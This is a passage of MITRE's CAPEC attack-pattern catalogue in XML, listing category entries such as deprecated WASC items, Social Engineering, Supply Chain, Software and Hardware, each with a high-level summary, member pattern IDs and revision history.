            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-43 - XML External Entities</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="377" Name="DEPRECATED: WASC-44 - XML Entity Expansion" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item XML Entity Expansion</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-44 - XML Entity Expansion</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="378" Name="DEPRECATED: WASC-45 - Fingerprinting" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Fingerprinting</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-45 - Fingerprinting</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="379" Name="DEPRECATED: WASC-46 - XQuery Injection" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item XQuery Injection</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-46 - XQuery Injection</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="380" Name="DEPRECATED: WASC Threat Classification 2.0 - WASC-47 - Insufficient Session Expiration" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Insufficient Session Expiration</ns0:Summary>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-324" Section="WASC-47 - Insufficient Session Expiration" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="381" Name="DEPRECATED: WASC Threat Classification 2.0 - WASC-48 - Insecure Indexing" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Insecure Indexing</ns0:Summary>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-325" Section="WASC-48 - Insecure Indexing" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="382" Name="DEPRECATED: WASC Threat Classification 2.0 - WASC-49 - Insufficient Password Recovery" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Insufficient Password Recovery</ns0:Summary>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-326" Section="WASC-49 - Insufficient Password Recovery" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="403" Name="Social Engineering" Status="Draft">
         <ns0:Summary>Attack patterns within this category focus on the manipulation and exploitation of people. The techniques defined by each pattern are used to convince a target into performing actions or divulging confidential information that benefit the adversary, often resulting in access to computer systems or facilities. While similar to a confidence trick or simple fraud, the term typically applies to trickery or deception for the purpose of information gathering, fraud, or computer system access. In most cases, the adversary never comes face-to-face with the victim.</ns0:Summary>
         <ns0:Relationships>
            <ns0:Has_Member CAPEC_ID="137" />
            <ns0:Has_Member CAPEC_ID="151" />
            <ns0:Has_Member CAPEC_ID="154" />
            <ns0:Has_Member CAPEC_ID="173" />
            <ns0:Has_Member CAPEC_ID="184" />
            <ns0:Has_Member CAPEC_ID="410" />
            <ns0:Has_Member CAPEC_ID="416" />
            <ns0:Has_Member CAPEC_ID="607" />
            <ns0:Has_Member CAPEC_ID="690" />
         </ns0:Relationships>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-09-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2023-01-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="436" Name="DEPRECATED: Gain Physical Access" Status="Deprecated">
         <ns0:Summary>This category has been deprecated as it is no longer used in any view.</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2017-05-01">Gain Physical Access</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="437" Name="Supply Chain" Status="Draft">
         <ns0:Summary>Attack patterns within this category focus on the disruption of the supply chain lifecycle by manipulating computer system hardware, software, or services for the purpose of espionage, theft of critical data or technology, or the disruption of mission-critical operations or infrastructure. Supply chain operations are usually multi-national with parts, components, assembly, and delivery occurring across multiple countries offering an attacker multiple points for disruption.</ns0:Summary>
         <ns0:Relationships>
            <ns0:Has_Member CAPEC_ID="116" /><ns0:Has_Member CAPEC_ID="154" />
            <ns0:Has_Member CAPEC_ID="176" />
            <ns0:Has_Member CAPEC_ID="184" />
            <ns0:Has_Member CAPEC_ID="438" />
            <ns0:Has_Member CAPEC_ID="439" />
            <ns0:Has_Member CAPEC_ID="440" />
            <ns0:Has_Member CAPEC_ID="690" />
         </ns0:Relationships>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-11-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-09-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2023-01-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="512" Name="Communications" Status="Draft">
         <ns0:Summary>Attack patterns within this category focus on the exploitation of communications and related protocols. The techniques defined by each pattern are used by an adversary to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.</ns0:Summary>
         <ns0:Relationships>
            <ns0:Has_Member CAPEC_ID="22" />
            <ns0:Has_Member CAPEC_ID="94" />
            <ns0:Has_Member CAPEC_ID="117" />
            <ns0:Has_Member CAPEC_ID="125" />
            <ns0:Has_Member CAPEC_ID="130" />
            <ns0:Has_Member CAPEC_ID="148" />
            <ns0:Has_Member CAPEC_ID="151" />
            <ns0:Has_Member CAPEC_ID="154" />
            <ns0:Has_Member CAPEC_ID="161" />
            <ns0:Has_Member CAPEC_ID="169" />
            <ns0:Has_Member CAPEC_ID="192" />
            <ns0:Has_Member CAPEC_ID="216" />
            <ns0:Has_Member CAPEC_ID="240" />
            <ns0:Has_Member CAPEC_ID="272" />
            <ns0:Has_Member CAPEC_ID="594" />
            <ns0:Has_Member CAPEC_ID="607" />
            <ns0:Has_Member CAPEC_ID="624" />
         </ns0:Relationships>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-11-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-09-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="513" Name="Software" Status="Draft">
         <ns0:Summary>Attack patterns within this category focus on the exploitation of software applications. The techniques defined by each pattern are used to exploit these weaknesses in the application's design or implementation in an attempt to achieve a desired negative technical impact.</ns0:Summary>
         <ns0:Relationships>
            <ns0:Has_Member CAPEC_ID="21" />
            <ns0:Has_Member CAPEC_ID="22" />
            <ns0:Has_Member CAPEC_ID="25" />
            <ns0:Has_Member CAPEC_ID="26" />
            <ns0:Has_Member CAPEC_ID="28" />
            <ns0:Has_Member CAPEC_ID="74" />
            <ns0:Has_Member CAPEC_ID="94" />
            <ns0:Has_Member CAPEC_ID="112" />
            <ns0:Has_Member CAPEC_ID="113" />
            <ns0:Has_Member CAPEC_ID="114" />
            <ns0:Has_Member CAPEC_ID="115" />
            <ns0:Has_Member CAPEC_ID="116" />
            <ns0:Has_Member CAPEC_ID="117" />
            <ns0:Has_Member CAPEC_ID="122" />
            <ns0:Has_Member CAPEC_ID="123" />
            <ns0:Has_Member CAPEC_ID="124" />
            <ns0:Has_Member CAPEC_ID="125" />
            <ns0:Has_Member CAPEC_ID="129" />
            <ns0:Has_Member CAPEC_ID="130" />
            <ns0:Has_Member CAPEC_ID="131" />
            <ns0:Has_Member CAPEC_ID="137" />
            <ns0:Has_Member CAPEC_ID="148" />
            <ns0:Has_Member CAPEC_ID="151" />
            <ns0:Has_Member CAPEC_ID="153" />
            <ns0:Has_Member CAPEC_ID="154" />
            <ns0:Has_Member CAPEC_ID="161" />
            <ns0:Has_Member CAPEC_ID="165" />
            <ns0:Has_Member CAPEC_ID="169" />
            <ns0:Has_Member CAPEC_ID="173" />
            <ns0:Has_Member CAPEC_ID="175" />
            <ns0:Has_Member CAPEC_ID="176" />
            <ns0:Has_Member CAPEC_ID="184" />
            <ns0:Has_Member CAPEC_ID="188" />
            <ns0:Has_Member CAPEC_ID="212" />
            <ns0:Has_Member CAPEC_ID="224" />
            <ns0:Has_Member CAPEC_ID="227" />
            <ns0:Has_Member CAPEC_ID="233" />
            <ns0:Has_Member CAPEC_ID="240" />
            <ns0:Has_Member CAPEC_ID="242" />
            <ns0:Has_Member CAPEC_ID="248" />
            <ns0:Has_Member CAPEC_ID="272" />
            <ns0:Has_Member CAPEC_ID="410" />
            <ns0:Has_Member CAPEC_ID="438" />
            <ns0:Has_Member CAPEC_ID="441" />
            <ns0:Has_Member CAPEC_ID="548" />
            <ns0:Has_Member CAPEC_ID="549" />
            <ns0:Has_Member CAPEC_ID="554" />
            <ns0:Has_Member CAPEC_ID="560" />
            <ns0:Has_Member CAPEC_ID="586" />
            <ns0:Has_Member CAPEC_ID="594" />
            <ns0:Has_Member CAPEC_ID="607" />
            <ns0:Has_Member CAPEC_ID="690" />
         </ns0:Relationships>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-11-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-09-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="514" Name="Physical Security" Status="Draft">
         <ns0:Summary>Attack patterns within this category focus on physical security. The techniques defined by each pattern are used to exploit weaknesses in the physical security of a system in an attempt to achieve a desired negative technical impact.</ns0:Summary>
         <ns0:Relationships>
            <ns0:Has_Member CAPEC_ID="116" />
            <ns0:Has_Member CAPEC_ID="117" />
            <ns0:Has_Member CAPEC_ID="188" />
            <ns0:Has_Member CAPEC_ID="390" />
            <ns0:Has_Member CAPEC_ID="440" />
            <ns0:Has_Member CAPEC_ID="507" />
            <ns0:Has_Member CAPEC_ID="607" />
         </ns0:Relationships>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-09-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="515" Name="Hardware" Status="Draft">
         <ns0:Summary>Attack patterns within this category focus on the exploitation of the physical hardware used in computing systems. The techniques defined by each pattern reflect the replacement, destruction, modification and exploitation of hardware components that make up a system in an attempt to achieve a desired negative technical impact. Attacks against hardware component fall into several broad categories depending upon the relative sophistication of the attacker and the type of systems that are targeted. Attacks against hardware components differ from software attacks in that hardware-based attacks target the chips, circuit boards, device ports, or other components that comprise a computer system or embedded system. Sophisticated attacks may involve adding or removing jumpers to an exposed system, or applying sensors to portions of the motherboard to read data as it traverses the system bus.</ns0:Summary>
         <ns0:Relationships>
            <ns0:Has_Member CAPEC_ID="26" />
            <ns0:Has_Member CAPEC_ID="74" />
            <ns0:Has_Member CAPEC_ID="113" />
            <ns0:Has_Member CAPEC_ID="114" />
            <ns0:Has_Member CAPEC_ID="116" />
            <ns0:Has_Member CAPEC_ID="122" />
            <ns0:Has_Member CAPEC_ID="124" />
            <ns0:Has_Member CAPEC_ID="148" />
            <ns0:Has_Member CAPEC_ID="151" />
            <ns0:Has_Member CAPEC_ID="154" />
            <ns0:Has_Member CAPEC_ID="161" />
            <ns0:Has_Member CAPEC_ID="176" />
            <ns0:Has_Member CAPEC_ID="188" />
            <ns0:Has_Member CAPEC_ID="192" />
            <ns0:Has_Member CAPEC_ID="212" />
            <ns0:Has_Member CAPEC_ID="233" />
            <ns0:Has_Member CAPEC_ID="438" />
            <ns0:Has_Member CAPEC_ID="439" />
            <ns0:Has_Member CAPEC_ID="440" />
            <ns0:Has_Member CAPEC_ID="441" />
            <ns0:Has_Member CAPEC_ID="548" />
            <ns0:Has_Member CAPEC_ID="560" />
            <ns0:Has_Member CAPEC_ID="607" />
            <ns0:Has_Member CAPEC_ID="624" />
         </ns0:Relationships>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-11-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-09-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="525" Name="DEPRECATED: Execute Code" Status="Deprecated">
         <ns0:Summary>This category has been deprecated as it is no longer used in any view.</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-11-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2015-11-09">Malicious Code Execution</ns0:Previous_Entry_Name>
            <ns0:Previous_Entry_Name Date="2017-05-01">Execute Code</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="526" Name="DEPRECATED: Alter System Components" Status="Deprecated">
         <ns0:Summary>This category has been deprecated as it is no longer used in any view.</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
